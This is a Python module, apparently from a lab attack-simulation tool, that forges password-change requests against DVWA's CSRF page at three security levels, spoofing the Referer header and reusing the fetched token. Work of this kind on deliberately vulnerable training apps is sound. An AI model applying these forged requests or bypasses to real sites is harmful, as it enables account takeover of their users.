"""CSRF attack against DVWA — forged password change."""

from .base import AttackModule, logger


class CsrfAttack(AttackModule):
    NAME = "csrf"

    def _attack(self, session, new_pass):
        # Visit the CSRF page and attempt a password change
        token = session.get_csrf_token("/vulnerabilities/csrf/")
        session.get(
            "/vulnerabilities/csrf/",
            params={
                "password_new": new_pass,
                "password_conf": new_pass,
                "Change": "Change",
                "user_token": token,
            },
        )
        logger.debug("[csrf] Attempted password change to: %s", new_pass)
        # Change it back to maintain session validity
        token = session.get_csrf_token("/vulnerabilities/csrf/")
        session.get(
            "/vulnerabilities/csrf/",
            params={
                "password_new": "password",
                "password_conf": "password",
                "Change": "Change",
                "user_token": token,
            },
        )

    def run_low(self, session):
        self._attack(session, "hacked123")

    def run_medium(self, session):
        # Medium checks Referer header
        session.session.headers["Referer"] = f"{session.base_url}/vulnerabilities/csrf/"
        self._attack(session, "hacked456")
        session.session.headers.pop("Referer", None)

    def run_high(self, session):
        # High has anti-CSRF token — we already extract it
        self._attack(session, "hacked789")
